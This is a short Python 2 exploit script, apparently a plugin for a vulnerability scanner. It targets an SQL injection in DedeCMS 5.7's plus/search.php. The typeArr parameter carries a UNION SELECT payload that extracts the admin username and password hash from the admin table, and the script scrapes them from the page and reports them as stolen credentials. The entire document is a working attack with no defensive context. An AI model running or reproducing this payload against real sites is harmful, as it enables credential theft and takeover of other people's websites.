def exploit(url):
	poc = 'http://'+url+'/plus/search.php?keyword=as&typeArr[111%3D@`\'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\'`+]=a'
	try:
		ok=fuck.urlget(poc)
		if ok.getcode() == 200:
			str=ok.read()
			username = fuck.find(r'<h3><a.*?>(\w+)</a></h3>',str)
			password = fuck.find(r'<p>(\w{20}\.{3})</p>',str)
			if len(username) != 0 and len(password) != 0:
				username = username[0]
				password = password[0][3:-4]
				fuck.report('dedecms5.7_search.php_SQLInject',"%s|%s"%(username,password))
				print "TARGET dedecms5.7_search.php_SQLInject VULNERABLE !"
	except Exception,e:
		print e
exploit(test_url)